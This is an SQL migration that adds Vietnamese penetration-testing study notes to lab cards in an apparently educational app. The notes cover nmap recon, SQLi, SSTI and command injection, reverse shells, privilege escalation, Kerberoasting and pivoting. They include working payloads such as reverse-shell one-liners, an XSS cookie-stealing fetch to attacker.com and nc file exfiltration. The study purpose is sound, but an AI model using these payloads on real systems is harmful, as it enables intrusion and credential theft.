-- 0035_lab_reference_notes: attach a 'reference' Markdown field to every
-- lab/assignment card's payload, extracted/condensed from the user's own
-- pentest study doc, so learners can review material inline without leaving
-- the lab. Rendered as a collapsible section below the step runner.

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Linux cơ bản & kiến thức nền (theo mục 0b-0c tài liệu)

**Lệnh cơ bản cần nhớ:** `ls -la` (liệt kê cả file ẩn), `cd`/`pwd`, `cat` (in nội dung file), `grep "chuỗi" <file>` (thêm `-r` để tìm trong thư mục con), `find . -name "*.php"` (tìm theo tên/đuôi), `|` (nối lệnh), `>`/`>>` (ghi/nối file), `chmod +x <file>`, `sudo <lệnh>`, `man <lệnh>`/`<lệnh> --help` khi quên flag, `Ctrl+C` để dừng lệnh.

**Mạng cơ bản (mục 0c):**
- **IP**: định danh 1 máy (`10.10.10.5`). **Port**: "cửa" riêng cho mỗi dịch vụ (0-65535) — không đoán theo số port, luôn xác minh bằng `nmap -sV`.
- **TCP** (có bắt tay, đảm bảo thứ tự — HTTP/SSH/FTP) vs **UDP** (gửi thẳng, không đảm bảo — DNS/SNMP, nên nmap phải quét UDP riêng bằng `-sU`).
- **`/etc/hosts`**: khi tài liệu bảo thêm domain (vd `corp.local`) vào `/etc/hosts`, lý do là máy mình không tự biết domain đó trỏ tới IP nào — phải khai báo tay.

**Quy ước tài liệu:** mọi dấu `<...>` (vd `<target-ip>`, `<user>`, `<password>`) nghĩa là phải tự thay giá trị thật, không gõ nguyên dấu `<` `>` vào terminal.

**Lấy IP target (mục 0a):** THM thường hiện sẵn IP trên trang room; nếu được cho cả dải mạng, dùng `nmap -sn 10.10.10.0/24` (ping sweep, không quét port) trước khi quét port cụ thể — nếu bị chặn ICMP, dùng `-Pn` hoặc `arp-scan --localnet`. Luôn `ping <target-ip>` trước khi nghi nmap lỗi.

**Gotcha:** VPN rớt/chậm do Wi-Fi không ổn — ưu tiên LAN; AttackBox tự timeout khi không hoạt động, cần bấm lại "Start AttackBox".'::text), true)
WHERE kind = 'lab' AND front = 'Lab 1 — Làm quen lệnh Linux cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## nmap & recon theo tầng (mục 2 "Khung tư duy 4 tầng" + mục 11 + mục 25-A)

**Tầng 1 — Phạm vi:** nếu được cho cả dải mạng, `nmap -sn 10.10.10.0/24` trước để biết IP nào sống; nếu chỉ 1 IP, bỏ qua tầng này.

**Tầng 2 — Port & Service, 2 bước bắt buộc theo đúng thứ tự:**
```bash
nmap -p- --min-rate=1000 -T4 <target>        # quét HẾT 65535 port, không chỉ top 1000 — sai lầm #1 (mục 28) là bỏ bước này
nmap -p <các-cổng-tìm-được> -sC -sV -A <target>   # soi kỹ: -sC script mặc định, -sV nhận diện version, -A thêm OS detection
nmap -sU --top-ports 20 <target>              # UDP hay bị bỏ sót (DNS/SNMP/TFTP) — luôn quét riêng
```
Xuất kết quả ra file: `-oN all_ports.txt` (chỉ bản text dễ đọc) hoặc `-oA <basename>` (xuất ĐỒNG THỜI cả 3 định dạng .nmap/.xml/.gnmap trong 1 lệnh — dùng khi vừa cần đọc nhanh vừa cần file để tool khác parse lại, như bước `-oA scan1` trong lab).

**Lưu ý cú pháp `-sn`:** luôn phải kèm 1 dải mạng CIDR (vd `-sn 10.10.10.0/24`) hoặc IP đơn lẻ ngay sau nó — không chạy `-sn` một mình mà không có target.

**Nguyên tắc đọc kết quả & ra quyết định:** ưu tiên thử (1) cửa không cần credential (FTP anon, SMB null, DB mở), (2) cửa web (phức tạp nhất nhưng thường là đường vào chính), (3) cửa cần credential (để sau).

**Gotcha khi thi/VPN không ổn (mục 28):** `--min-rate`/`-T4` quá cao trên VPN lag có thể làm port "closed" giả (mất gói, không phải đóng thật) — giảm tốc độ hoặc quét lại 2 lần để đối chiếu trước khi kết luận.

**Tầng 4 — lặp lại sau khi có quyền mới:** mỗi lần có shell/credential mới, quay lại enumerate với góc nhìn mới — `netstat -tulnp` (service nội bộ), `ip a` (có dải mạng thứ 2 = dấu hiệu cần pivoting), `id; sudo -l; find / -perm -4000`.

**Công cụ bổ sung:** `fping -a -g <cidr>` (ping sweep nhanh hơn), `arp-scan --localnet` khi cùng LAN.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 2 — Host discovery & quét cổng (nmap)';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Web enumeration & Burp Suite (mục 0d, mục 1, Tầng 3 mục 2, mục 4)

**Burp Suite workflow (mục 0d):** mở → "Temporary project" → dùng trình duyệt tích hợp của Burp (đã tự set proxy) → tab Proxy bật "Intercept" → Repeater để sửa/gửi lại request (test IDOR, SQLi...) → Intruder để fuzz/brute-force (đánh dấu vị trí bằng `§`). **Bắt buộc:** set Target Scope trước khi Intercept để tránh test ngoài phạm vi RoE; cài CA cert Burp (`http://burp`) nếu target dùng HTTPS, nếu không sẽ luôn báo "certificate not trusted".

**Lập bản đồ app trước khi đụng vào gì (Tầng 3a):**
```bash
curl -s http://<target>/robots.txt
ffuf -u http://<target>/FUZZ -w raft-medium-directories.txt
whatweb http://<target>
```
Duyệt thủ công toàn bộ chức năng, Burp bắt hết request.

**Với mỗi input point tìm được, hỏi:** "dữ liệu này đi đâu, và nếu đưa dữ liệu khác thường vào thì sao?" — đây là cách enumerate lỗi có hệ thống theo OWASP Top 10 (mục 4), thay vì đoán ngẫu nhiên.

**HTTP cơ bản (mục 1):** status code quan trọng — 200 (vẫn phải xem nội dung, có thể "giả 200"), 302 (theo dõi redirect, có thể bypass), 401/403 (thử đổi method/header/path), 500. Cookie thiếu `Secure`/`HttpOnly`/`SameSite` là dấu hiệu đáng chú ý.

**Thói quen:** thử kết hợp nhiều điểm chạm — nhiều lỗ hổng thật chỉ lộ khi kết hợp (vd upload được file nhưng phải tìm qua `?file=` ở chỗ khác mới thực thi được).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 3 — Web enumeration cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## SQL Injection (mục 6)

Nhóm lỗi quan trọng nhất của cả PT1 và WEB1. **Dấu hiệu nhận biết:** thêm `''` vào input, thấy lỗi SQL hoặc hành vi bất thường.

**Login bypass:**
```
username=admin'' --
```
Query trở thành `... WHERE username=''admin'' --'' AND password=''...''`, phần sau `--` bị comment.

**Union-based** (kết quả hiển thị trực tiếp):
```sql
'' UNION SELECT null,null,null-- -
'' UNION SELECT username,password,null FROM users-- -
```

**Blind SQLi** (không thấy kết quả trực tiếp):
```sql
'' AND 1=1-- -        (true)
'' AND 1=2-- -        (false)
'' AND SLEEP(5)-- -   (time-based — delay đúng 5s = xác nhận injection)
```

**Công cụ tự động:** `sqlmap -u "http://target/page?id=1" --dbs` — nhưng nên tự tay làm thủ công trước để hiểu bản chất (bài thi có thể chấm cả report giải thích "vì sao" lỗi xảy ra).

**Thói quen chung:** mọi injection theo pattern "phá cú pháp → quan sát khác biệt → leo thang" — luôn thử payload đơn giản nhất trước để xác nhận, rồi mới viết payload phức tạp.

**Phòng vệ (cho report):** Prepared Statement/Parameterized Query cho MỌI query — cách duy nhất phòng triệt để, không phải lọc ký tự đặc biệt (dễ bypass). Xem OWASP SQL Injection Prevention Cheat Sheet.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 4 — SQL Injection (manual + sqlmap)';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## LFI & Command Injection (mục 6, mục 20)

**Command Injection** — khi app chạy lệnh hệ thống với input user (vd chức năng ping/kiểm tra domain):
```
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 $(whoami)
```
Thử nhiều kiểu nối lệnh (`;`, `&&`, `|`, `` ` ``, `$()`) vì mỗi OS/shell chặn khác nhau.

**SSTI (Server-Side Template Injection)** — khi app dùng template engine (Jinja2, Twig, Freemarker) và nhúng thẳng input vào template:
```
{{7*7}}   → trả về 49 = có SSTI (Jinja2/Twig)
${7*7}    → Freemarker
```
Leo lên RCE (Jinja2): `{{ self.__init__.__globals__.__builtins__.__import__(''os'').popen(''id'').read() }}`

**LFI (Local File Inclusion) — file hay thử đầu tiên:**
```
/etc/passwd                            (Linux — xác nhận có LFI)
/var/www/html/config.php               (lộ DB credential)
C:\Windows\System32\drivers\etc\hosts  (Windows — xác nhận có LFI)
```
Nếu LFI đọc được log file (vd Apache access log) và kiểm soát được nội dung ghi vào log (vd header User-Agent) → leo từ LFI lên RCE bằng **log poisoning**.

**Path/file hay bị quên:** `/robots.txt`, `/.git/` (dùng git-dumper/GitTools tải cả source+lịch sử commit), `/.env` (DB password/API key trực tiếp), `/backup.zip`, `/wp-config.php.bak`.

**Thói quen:** luôn thử payload đơn giản trước (`''`, `;`, `{{7*7}}`) để xác nhận lỗ hổng tồn tại.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 5 — LFI & Command Injection';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Reverse Shell & TTY Upgrade (mục 20)

**Mở listener trước:** `nc -lvnp 4444`

**Payload theo ngôn ngữ có sẵn trên target:**
```bash
# Bash
bash -i >& /dev/tcp/<your-ip>/4444 0>&1
# Python
python3 -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])''
# PHP
php -r ''$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");''
```
**Mẹo tốt nhất khi không nhớ payload:** dùng revshells.com — nhập IP/port, chọn ngôn ngữ, copy ngay.

**Upgrade shell** (shell thô thiếu TAB-complete, Ctrl+C làm mất kết nối):
```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# Ctrl+Z, trên máy mình:
stty raw -echo; fg
# rồi gõ tiếp:
export TERM=xterm
```

**tmux là bắt buộc khi thực chiến** (mục 0b): nếu mất SSH/VPN giữa lúc chạy lệnh lâu, không dùng tmux thì lệnh/shell chết theo kết nối — dùng tmux thì `tmux attach` lại thấy tiến độ vẫn chạy. Nên 1 window riêng cho mỗi máy target.

**Đưa file vào máy đã chiếm (mục 21):** mở web server trên máy mình `python3 -m http.server 8000`, trên target: `wget http://<your-ip>:8000/linpeas.sh -O /tmp/linpeas.sh`. Nếu không ra Internet được, dùng SMB: `impacket-smbserver share . -smb2support`.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 6 — Reverse shell & nâng cấp TTY';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Linux Privilege Escalation (mục 11, mục 20)

**Quick win — luôn thử trước khi chạy linpeas:**
```bash
sudo -l                                      # lệnh nào chạy sudo không cần password
find / -perm -4000 2>/dev/null               # SUID binary
cat /etc/crontab; ls -la /etc/cron.d/        # cron job chạy bởi root, script ghi được không?
find / -writable -type d 2>/dev/null | grep -v proc
```

**Sau khi `sudo -l`/SUID ra 1 lệnh lạ:** tra NGAY trên **gtfobins.github.io**, chọn đúng tab (Sudo vs SUID — lệnh khai thác khác nhau giữa 2 tab). Ví dụ `sudo -l` cho phép chạy `tar`:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Giải thích: `tar` có `--checkpoint-action` để chạy lệnh tùy ý; nếu `tar` chạy qua `sudo`, lệnh đó thừa hưởng quyền sudo. Đây là pattern chung của GTFOBins: binary có tính năng phụ (chạy lệnh, đọc/ghi file, shell debug) bị lợi dụng khi có SUID/sudo.

**Nếu binary không có trên GTFOBins:** không phải mọi SUID đều khai thác được (`ls`, `cat` vô hại). Chạy `linpeas.sh` và đọc kỹ output (dòng tô màu đỏ/vàng — sai lầm phổ biến là chạy xong không đọc, mục 28).

**Chén thánh:** `/etc/shadow` (chỉ root đọc được — lấy được gần như đồng nghĩa đã có root):
```bash
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```
Giá trị: chứng minh impact + hash có thể tái dùng (password reuse) sang máy khác.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 7 — Linux Privilege Escalation';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## AD Enumeration (mục 12-14)

**Khái niệm nền (mục 12, học trước khi tấn công):** Domain (nhóm máy/user dùng chung chính sách) → Forest (nhiều domain) → DC giữ NTDS.dit → OU + GPO (chính sách áp xuống, có thể bị lợi dụng chiếm hàng loạt máy) → mỗi object có SID riêng, quyền quản lý qua ACL/ACE (nền của phần privesc mục 17) → Trust giữa domain/forest.

**Kerberos (mục 13) — mấu chốt:** User xin TGT từ KDC (mã hoá bằng hash `krbtgt`) → dùng TGT xin TGS cho 1 service cụ thể (TGS mã hoá bằng hash của chính service đó) → đưa TGS cho service tự giải mã. **Bất kỳ ai cũng xin được TGS cho 1 service** (không cần quyền) — đây là cơ sở của Kerberoasting (mục 15).

**Enumeration không credential (null/guest session):**
```bash
nmap -p 88,389,445,135 <target>      # Kerberos/LDAP/SMB/RPC = dấu hiệu AD/DC
enum4linux-ng <target>                # null session: user/group/share
rpcclient -U "" <target>
kerbrute userenum --dc <target> -d <domain> userlist.txt   # đoán user hợp lệ, không bị log như brute-force
```

**Có 1 credential (dù thấp quyền):**
```bash
netexec smb <target> -u <user> -p <pass> --users --groups --shares
ldapsearch / windapsearch          # query trực tiếp LDAP
```
**BloodHound** là công cụ quan trọng nhất của enum AD: `bloodhound-python`/SharpHound thu thập (user/group/session/ACL) → nạp vào BloodHound GUI → vẽ đường ngắn nhất tới Domain Admin. Học thành thạo BloodHound là kỹ năng ROI cao nhất cho AD.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 8 — Active Directory enumeration';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Password Attacks — Spraying/AS-REP/Kerberoasting (mục 15, mục 0f)

**Lưu ý:** tài liệu không có nội dung riêng về `hydra` (chỉ nhắc tên 1 lần làm ví dụ lệnh chạy lâu trong phần tmux) — phần "credential access" của tài liệu tập trung vào AD (netexec/Impacket/hashcat), không có hướng dẫn hydra/brute-force SSH-FTP cụ thể.

**Password Spraying:** thử 1 password phổ biến trên NHIỀU user (tránh lockout), khác brute-force (nhiều password trên 1 user):
```bash
netexec smb <target> -u users.txt -p ''Password1'' --continue-on-success
```

**AS-REP Roasting:** nhắm user có *"Do not require Kerberos preauthentication"* — **không cần credential nào trước đó**:
```bash
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
```

**Kerberoasting:** nhắm **service account** (có SPN) — **cần ít nhất 1 credential domain hợp lệ** (khác AS-REP):
```bash
GetUserSPNs.py <domain>/<user>:<pass> -request -format hashcat
hashcat -m 13100 hash.txt rockyou.txt
```
**Phân biệt 2 kỹ thuật hay nhầm:** cả hai "xin vé Kerberos rồi bẻ offline" nhưng khác loại tài khoản bị nhắm và việc có cần credential trước hay không.

**Nhận diện hash trước khi crack (mục 0f):** `hashid ''<hash>''`; NTLM = 32 hex (`-m 1000`), AS-REP dạng `$krb5asrep$23$...` (`-m 18200`), Kerberoast TGS dạng `$krb5tgs$23$*...` (`-m 13100`).

**Phòng vệ:** bắt buộc preauth Kerberos, gMSA cho service account, account lockout policy hợp lý.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 9 — Password attacks (hydra / hashcat / john)';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## tmux Shortcuts (mục 0b)

**Vì sao bắt buộc dùng khi thực chiến:** nếu mất kết nối SSH/VPN giữa lúc chạy lệnh lâu (`nmap -p-`, `hydra` brute-force) — không dùng tmux thì lệnh chết theo kết nối; dùng tmux chỉ cần `tmux attach` lại là thấy đúng tiến độ vẫn chạy.

**Mọi phím tắt bắt đầu bằng prefix `Ctrl+B`, nhấn rồi thả, mới gõ phím sau** (không giữ cả 2 cùng lúc trừ khi ghi rõ):

| Muốn làm gì | Phím tắt |
|---|---|
| Tạo session mới có tên | `tmux new -s <ten>` (ngoài tmux) |
| Detach (thu nhỏ, session chạy ngầm) | `Ctrl+B` rồi `D` |
| Attach lại session ngầm | `tmux attach -t <ten>` (hoặc `tmux a`) |
| Xem danh sách session | `tmux ls` (ngoài tmux) |
| Chia pane ngang (trên/dưới) | `Ctrl+B` rồi `"` |
| Chia pane đứng (trái/phải) | `Ctrl+B` rồi `%` |
| Di chuyển qua pane kế bên | `Ctrl+B` rồi phím mũi tên |
| Đóng pane hiện tại | `Ctrl+B` rồi `X`, hoặc gõ `exit` |
| Zoom pane toàn màn hình | `Ctrl+B` rồi `Z` |
| Tạo window mới | `Ctrl+B` rồi `C` |
| Chuyển window kế/trước | `Ctrl+B` rồi `N`/`P` |
| Chuyển thẳng tới window số X | `Ctrl+B` rồi `0`-`9` |
| Đổi tên window | `Ctrl+B` rồi `,` |
| Vào copy mode (cuộn xem output cũ) | `Ctrl+B` rồi `[`, mũi tên/`PgUp`, `Q` để thoát |
| Copy trong copy mode | `Space` bắt đầu chọn, `Enter` kết thúc |
| Dán text đã copy | `Ctrl+B` rồi `]` |

**Thói quen đề xuất:** mỗi máy target 1 window riêng (`Ctrl+B C` rồi đổi tên bằng `Ctrl+B ,`), mỗi window chia 2 pane (`Ctrl+B "`): 1 pane chạy lệnh, 1 pane tra tài liệu/ghi note.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 10 — tmux: thao tác window/pane nhanh';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Windows Privilege Escalation (mục 11, mục 20)

**Quick win — kiểm tra ngay khi có shell:**
```powershell
whoami /priv              # có SeImpersonatePrivilege? → PrintSpoofer/JuicyPotato lấy SYSTEM gần như ngay lập tức
whoami /groups
systeminfo                # bản vá đã cài, tra CVE chưa patch
sc qc <service_name>      # service chạy bởi SYSTEM nhưng binary ghi được → thay thế binary
```
Script tự động: `winPEAS.exe`. Tra lệnh lạ trên **LOLBAS** (lolbas-project.github.io) — tương đương GTFOBins cho Windows, cách dùng giống nhau (chọn đúng tab tương ứng cách tìm thấy).

**Chén thánh — SAM database** (`C:\Windows\System32\config\SAM`, luôn bị khoá khi Windows chạy):
```powershell
reg save HKLM\SAM SAM.save
reg save HKLM\SYSTEM SYSTEM.save
```
Giải mã offline (cần cả SYSTEM hive):
```bash
secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
```
Hash NTLM lấy được dùng lại qua Pass-the-Hash nếu máy dùng chung local admin password (lỗi cấu hình rất phổ biến).

**Lưu ý:** lấy được SAM là KẾT QUẢ của privesc thành công (cần local admin trước), không phải bước đầu — giá trị là chứng minh impact + tái sử dụng hash.

**Lưu ý khác biệt với máy AD (Kịch bản C, mục 25):** Windows độc lập không có BloodHound/ACL abuse — privesc xoay quanh CVE service cụ thể (EternalBlue, PrintNightmare), service misconfig, hoặc unquoted service path.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 11 — Windows Privilege Escalation cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Pivoting / Tunneling (mục 21)

**Dấu hiệu cần pivoting:** máy đã chiếm có 2 card mạng (`ip a`/`ipconfig` ra 2 dải IP khác nhau) — dải mạng thứ 2 là mục tiêu tiếp theo.

**SSH local port forward** (đơn giản nhất, nếu đã có SSH vào máy trung gian):
```bash
ssh -L 8080:<internal-target>:80 user@<pivot-host>
# truy cập localhost:8080 trên máy mình = truy cập internal-target:80
```

**Chisel** (dùng khi không có SSH, phổ biến nhất trong CTF hiện nay):
```bash
# Máy tấn công (server):
chisel server -p 8000 --reverse
# Máy pivot đã chiếm (client), mở SOCKS proxy:
chisel client <your-ip>:8000 R:socks
# Dùng proxychains để chạy công cụ như đang ở trong mạng đó:
proxychains nmap -sT <internal-ip>
```

**SSH dynamic port forward** (tạo SOCKS proxy nhanh nếu có SSH):
```bash
ssh -D 9050 user@<pivot-host>
proxychains firefox
```

**Qua SMB** (khi target không ra Internet nhưng kết nối nội bộ được):
```bash
impacket-smbserver share . -smb2support     # trên máy tấn công
copy \\<your-ip>\share\winpeas.exe .        # trên target Windows
```

**Lấy file ra khỏi máy target** (hay cần cho NTDS.dit/SAM): `nc <your-ip> 4444 < file.txt` (target) + `nc -lvnp 4444 > file.txt` (máy mình).'::text), true)
WHERE kind = 'lab' AND front = 'Lab 12 — File transfer & pivoting/tunneling';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## XSS, SSRF, XXE (mục 7, mục 21)

**XSS cơ bản** (chèn vào input hiển thị lại trên trang):
```html
<script>alert(document.domain)</script>
```
Bypass filter: `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `"><script>alert(1)</script>`.

**XSS lấy cookie (chứng minh impact cho report):**
```html
<script>fetch(''http://attacker.com/steal?c=''+document.cookie)</script>
```
Dựng listener: `nc -lvnp 8000` hoặc `python3 -m http.server`.

**CSRF:** lừa trình duyệt nạn nhân (đang đăng nhập) tự gửi request không chủ ý — kiểm tra app có CSRF token và có verify đúng không.

**XXE (XML External Entity)** — khi app parse XML không tắt "external entity" (dấu hiệu: upload/parse XML, SOAP, file Office/SVG):
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```
Blind XXE (không hiển thị trực tiếp) → out-of-band qua DTD ngoài để exfiltrate.

**SSRF:** XXE cũng dùng được để làm server tự gửi request tới địa chỉ nội bộ, vd `http://169.254.169.254/` để lấy metadata cloud. (SSRF cũng nằm trong OWASP A10 — "request phía server bị user điều khiển để truy cập nội bộ".)

**Phòng vệ chung:** encode output đúng ngữ cảnh + CSP cho XSS; CSRF token + `SameSite` cookie; tắt external entity resolution trong XML parser cho XXE/SSRF.'::text), true)
WHERE kind = 'lab' AND front = 'Lab 13 — Web: XSS, SSRF, XXE cơ bản';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: FTP Backdoor Exploitation

Tài liệu không có 1 "assignment" riêng tên này, nhưng **Kịch bản A (mục 25) — "Máy Linux/Web điển hình"** là walkthrough khớp gần nhất, bước 1-3:

```bash
nmap -p- --min-rate=1000 -T4 <target-ip> -oN all_ports.txt     # Bước 1: quét hết port
nmap -p 21,22,80,139,445 -sC -sV -A <target-ip>                 # Bước 2: -sC thường tự trả "FTP anonymous login allowed"
ftp <target-ip>
# Username: anonymous / Password: (trống hoặc anonymous)        # Bước 3
```
Vào được: `ls -la`, tải hết file về xem (`get <file>` hoặc `mget *`) — tìm config/credential/backdoor script để lại trong FTP.

Bảng default creds (mục 19) nhấn mạnh: FTP (21) luôn thử `anonymous`/`anonymous` trước — "rất nhiều server vẫn bật sẵn. Nếu vào được, luôn `ls -la` xem có file nhạy cảm (backup, config, SSH key)".

Nếu tìm được credential/SSH key qua FTP, thử password reuse trên SSH (bước 6, Kịch bản A): `ssh <user>@<target-ip>`.

**Về "backdoor" cụ thể** (vd vsftpd 2.3.4 backdoored command execution): tài liệu KHÔNG có nội dung riêng về lỗ hổng backdoor nổi tiếng này — chỉ có hướng dẫn chung "tra CVE theo version banner nmap trả về" (mục 0e, mục 22) qua `searchsploit <service> <version>`.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 1 — External recon đến foothold qua FTP backdoor';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: SQLi → Credential Dump

Khớp với mục 6 (SQL Injection) + Kịch bản A bước 5 (mục 25):

```
# Burp Repeater: thử '' vào username, xem có lỗi SQL không
# Hoặc login bypass trực tiếp: username = admin'' --
```
Nếu xác nhận được SQLi, khai thác sâu bằng sqlmap:
```bash
sqlmap -u "http://<target-ip>/login" --data="username=admin&password=test" --dbs
```
(mục 6 còn có ví dụ Union-based `'' UNION SELECT username,password,null FROM users-- -` và Blind `'' AND SLEEP(5)-- -` để tự tay dump thủ công trước khi dùng sqlmap — "nên tự tay làm thủ công trước để hiểu bản chất, vì bài thi có thể chấm cả report giải thích ''vì sao''".)

Sau khi dump được username/password hash từ DB: nhận diện loại hash (mục 0f, `hashid`), bẻ bằng `john`/`hashcat` theo đúng `-m`, rồi **thử lại credential đó trên mọi service khác đang mở** (SSH, FTP...) — password reuse là sai lầm phổ biến nhất bị bỏ sót theo mục 28 ("Quên thử lại credential/hash đã có trên service khác").

**Phòng vệ (cho report):** Prepared Statement/Parameterized Query cho mọi query — không nối chuỗi trực tiếp, không chỉ lọc ký tự đặc biệt.'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 2 — Web enum đến SQLi dump credentials';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: File Upload → Reverse Shell

Khớp mục 20 "File Upload Bypass" + "Reverse shell":

**Bypass filter đuôi file:**
- Đổi đuôi: `shell.php` → `shell.phtml`, `shell.php5`, `shell.pHp` (tránh check case-sensitive)
- Double extension: `shell.jpg.php`
- Null byte (server cũ): `shell.php%00.jpg`
- Sửa **Content-Type** trong Burp Repeater thành `image/jpeg` dù đuôi vẫn `.php`
- Nếu chỉ check magic bytes đầu file: thêm header ảnh giả (vd `GIF89a;`) trước code PHP
- Upload được nhưng không biết path lưu: thử `/uploads/`, `/images/`, `/files/` hoặc xem response có lộ path không

**Sau khi upload shell thành công, truy cập file đó → có reverse shell** (mục 20 reverse shell): mở listener `nc -lvnp 4444` trước, payload PHP:
```bash
php -r ''$sock=fsockopen("<your-ip>",4444);exec("/bin/sh -i <&3 >&3 2>&3");''
```
Hoặc dùng revshells.com để generate payload nhanh.

**Upgrade shell** ngay sau khi có (shell thô thiếu TAB-complete):
```bash
python3 -c ''import pty; pty.spawn("/bin/bash")''
# Ctrl+Z, rồi: stty raw -echo; fg
export TERM=xterm
```
Từ đây tiếp tục enumerate privesc (mục 11/20: `sudo -l`, `find / -perm -4000` → GTFOBins).'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 3 — File upload vulnerability đến reverse shell';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: LFI + Log Poisoning → RCE

Khớp mục 20 "File đọc được qua LFI":

**File hay thử đầu tiên để xác nhận LFI:**
```
/etc/passwd                          (Linux)
/var/www/html/config.php             (lộ DB credential)
C:\Windows\System32\drivers\etc\hosts  (Windows)
```

**Log poisoning — leo từ LFI lên RCE:** "Nếu LFI có thể đọc được log file (vd Apache access log) và bạn kiểm soát được nội dung ghi vào log (vd User-Agent header), có thể leo từ LFI lên RCE". Cơ chế: chèn PHP code vào User-Agent khi gửi request → request đó bị ghi vào access log → dùng LFI include chính file log đó → PHP code trong log được thực thi.

**Path/file hay bị quên** (mục 20, cũng hữu ích để tìm entry point):
```
/robots.txt, /.git/ (git-dumper/GitTools), /.env, /backup.zip, /wp-config.php.bak
```

Tài liệu không có ví dụ payload log-poisoning cụ thể (vd chuỗi User-Agent PHP tag chính xác) hay command LFI→RCE từng bước chi tiết — chỉ nêu khái niệm và điều kiện (đọc được log + kiểm soát nội dung ghi vào log). Phần "Reflex table" (mục 29) có dòng liên quan: response có `X-Powered-By: PHP/7.2` → thử `?page=../../../etc/passwd` nếu có tham số include file → có LFI → thử log poisoning lên RCE (mục 20).'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 4 — LFI + log poisoning đến RCE';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: Linux Sudo Privesc

Khớp đầy đủ mục 11 + mục 20 "Linux Privesc":

```bash
sudo -l                           # lệnh nào chạy sudo không cần password
find / -perm -4000 2>/dev/null    # SUID binary
```

**Ví dụ cụ thể trong tài liệu** — `sudo -l` trả về được chạy `tar`:
```bash
sudo -l
# (sudoers) /usr/bin/tar
```
Tra `tar` trên gtfobins.github.io → chọn tab **Sudo** (khác tab SUID):
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
**Vì sao hoạt động:** `tar` có `--checkpoint-action` để chạy lệnh tùy ý trong lúc nén/giải nén (nguyên bản để log tiến độ) — nếu `tar` chạy qua `sudo`, lệnh được gọi cũng thừa hưởng quyền sudo đó. Đây là pattern chung của hầu hết entry GTFOBins: binary có tính năng phụ bị lợi dụng khi được cấp sudo/SUID.

**Quy trình đúng:** mỗi binary trên GTFOBins có nhiều tab (Sudo, SUID, Capabilities, File read/write, Shell) — chọn đúng tab tương ứng với CÁCH bạn tìm thấy binary đó. Chạy xong, `id` để xác nhận `uid=0(root)`.

**Nếu binary không có trên GTFOBins:** không phải mọi SUID khai thác được — chạy `linpeas.sh` và đọc kỹ (dòng tô màu).'::text), true)
WHERE kind = 'lab' AND front = 'Assignment 5 — Linux privesc qua sudo misconfiguration';

UPDATE cards SET payload = jsonb_set(payload, '{reference}', to_jsonb('## Assignment: AS-REP Roasting

Khớp mục 15 + Kịch bản B bước 4 (mục 25):

**Điều kiện:** nhắm user có thuộc tính *"Do not require Kerberos preauthentication"* bị bật — **không cần credential nào trước đó**.

```bash
GetNPUsers.py <domain>/ -usersfile userlist.txt -no-pass -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

**Trước đó cần danh sách user** — lấy từ enumeration không credential (mục 14):
```bash
enum4linux-ng -A <target-ip>
kerbrute userenum --dc <target-ip> -d corp.local userlist.txt
```

**Nhận diện hash** (mục 0f): dạng `$krb5asrep$23$user@REALM:...` → `-m 18200`.

**Phân biệt với Kerberoasting** (dễ nhầm): AS-REP nhắm user thiếu preauth (không cần credential trước), Kerberoasting nhắm service account có SPN (cần ≥1 credential domain hợp lệ).

